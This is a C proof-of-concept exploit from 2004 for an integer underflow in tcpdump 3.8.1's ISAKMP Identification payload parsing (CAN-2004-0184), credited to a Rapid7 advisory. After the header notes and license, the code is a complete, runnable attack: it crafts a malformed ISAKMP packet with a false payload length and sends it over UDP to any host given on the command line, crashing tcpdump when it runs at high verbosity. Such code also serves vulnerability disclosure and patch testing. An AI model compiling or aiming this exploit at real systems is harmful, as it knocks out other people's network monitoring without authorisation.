/*
 * tcpdump packet sniffer
 * Integer underflow in ISAKMP Identification payload
 * denial of service vulnerability
 * proof of concept code
 * version 1.0 (Apr 02 2004)
 * CVE-ID: CAN-2004-0184
 *
 * by Remi Denis-Courmont < exploit at simphalampin dot com >
 *   http://www.simphalempin.com/dev/
 * Remi Denis-Courmont is not responsible for the misuse of the
 * source code provided hereafter.
 * 
 * This vulnerability was found by:
 *   Rapid7, LLC Security Advisory - http://www.rapid7.com/
 * whose original advisory may be fetched from:
 *   http://www.rapid7.com/advisories/R7-0017.html
 *
 * Vulnerable:
 *  - tcpdump 3.8.1
 *
 * Not vulnerable:
 *  - tcpdump 3.8.3
 *
 * NOTES:
 *   The vulnerability cannot be exploited to cause a denial of service
 * with the Debian's tcpdump packages as it was partly fixed as part of
 * the fix for earlier known CAN-2003-0108 vulnerability, though the bug
 * is still present. That may be the case for other vendors which were
 * not investigated.
 *
 *   tcpdump must be run with a verbosity level of at least 3:
 * # tcpdump -vvv
 * Otherwise, no denial of service will occur.
 */


/*****************************************************************************
 * Copyright (C) Remi Denis-Courmont 2004.                                   *
 *                                                                           *
 * Redistribution and use in source and binary forms, with or without        *
 * modification, are permitted provided that the following conditions        *
 * are met:                                                                  *
 * 1. Redistributions of source code must retain the above copyright         *
 *    notice, this list of conditions and the following disclaimer.          *
 * 2. Redistributions in binary form must reproduce the above copyright      *
 *    notice, this list of conditions and the following disclaimer in the    *
 *    documentation and/or other materials provided with the distribution.   *
 *                                                                           *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR      *
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES *
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.   *
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,          *
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT  *
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, *
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY     *
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT       *
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF  *
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.         *
 *****************************************************************************/


#include <string.h>
#include <stdio.h>

#include <sys/types.h>
#include <unistd.h>
#include <sys/socket.h>

#include <netdb.h>

static const char packet[] =
	/* ISAKMP header */
	"\x00\x00\x00\x00\x00\x00\x00\x00" /* Initiator cookie */
	"\x00\x00\x00\x00\x00\x00\x00\x00" /* Responder cookie */
	"\x05"			/* Next payload: Identification */
	"\x10"			/* Version: 1.0 */
	"\x01"			/* Exchange type */
	"\x00"			/* Flags */
	"\x00\x00\x00\x00"	/* Message ID */
	"\x00\x00\x00\x24"	/* Length */
	
	/* ISAKMP Identification payload */
	"\x00"			/* Next payload: none */
	"\x00"			/* Reserved */
	"\x00\x05"		/* Payload length (incorrect) */
	"\x20"			/* ID type (unknown) */
	"\x00\x00\x00"		/* DOI */
;

static int
send_evil_packet (const struct addrinfo *r)
{
	int fd;
	size_t len;
		
	fd = socket (r->ai_family, r->ai_socktype, r->ai_protocol);
	if (fd == -1)
	{
		perror ("Socket error");
		return 1;
	}

	len = sizeof (packet) - 1;
	if (sendto (fd, packet, len, 0, r->ai_addr, r->ai_addrlen) != len)
	{
		perror ("Packet sending error");
		close (fd);
		return 1;
	}
	
	puts ("Packet sent!");
	close (fd);
	return 0;
}


static int
proof (const char *hostname)
{
	struct addrinfo *res;
	int check;
	
	{
		struct addrinfo help;
		memset (&help, 0, sizeof (help));
		help.ai_socktype = SOCK_DGRAM;
	
		check = getaddrinfo (hostname, "isakmp", &help, &res);
	}
	
	if (check == 0)
	{
		struct addrinfo *ptr;

		for (ptr = res; ptr != NULL; ptr = ptr->ai_next)
			check |= send_evil_packet (ptr);

		freeaddrinfo (res);
		return check;
	}

	fprintf (stderr, "%s: %s\n", hostname, gai_strerror (check));
	return -1;
}


static void
usage (const char *path)
{
	fprintf (stderr, "Usage: %s <hostname/IP>\n", path);
}


int
main (int argc, char *argv[])
{
	puts ("tcpdump Integer underflow in ISAKMP Identification payload\n"
		"proof of concept code\n"
		"Copyright (C) Remi Denis-Courmont 2004 "
		"<\x65\x78\x70\x6c\x6f\x69\x74\x40\x73\x69\x6d\x70"
		"\x68\x61\x6c\x65\x6d\x70\x69\x6e\x2e\x63\x6f\x6d>\n");
			
			
	if (argc != 2)
	{
		usage (argv[0]);
		return 2;
	}
		
	return proof (argv[1]) ? 1 : 0;
}
